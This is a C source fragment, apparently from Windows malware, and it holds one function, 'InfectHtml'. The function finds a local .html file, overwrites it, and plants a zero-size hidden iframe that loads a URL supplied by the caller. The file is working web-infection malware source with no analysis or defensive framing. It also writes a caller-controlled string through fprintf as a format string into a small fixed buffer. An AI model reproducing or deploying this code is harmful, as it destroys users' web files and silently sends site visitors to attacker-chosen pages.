#include "wALL.h"
#include "Defines.h"

void InfectHtml(char* frame)
{

   WIN32_FIND_DATA FindFileData;
   HANDLE hFind;
   char xFrame[128];

   if( frame == NULL )
   {
      return;
   }

   hFind = FindFirstFile("*.html", &FindFileData);
   if (hFind == INVALID_HANDLE_VALUE) 
   {
      return;
   } 
   else 
   {
	   wsprintf(xFrame, "<iframe src=\"%s\" width=\"0\" height=\"0\" frameborder=\"0\"></iframe>", frame);  	  
		FILE* xFile = fopen(FindFileData.cFileName, "wb");
		if(xFile)
		{
			fprintf(xFile, xFrame);
			fclose(xFile);
		}
      FindClose(hFind);
   }
   return;
}
